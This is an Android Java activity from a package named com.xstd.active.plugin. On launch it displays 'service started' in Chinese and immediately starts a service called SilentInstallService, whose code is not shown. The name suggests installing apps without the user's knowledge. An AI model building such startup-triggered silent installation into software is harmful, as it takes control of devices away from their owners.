package com.xstd.active.plugin;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		TextView tv = new TextView(getApplicationContext());
		tv.setText("开启服务了");
		setContentView(tv);
		startService(new Intent(getApplicationContext(), SilentInstallService.class));
	}

}
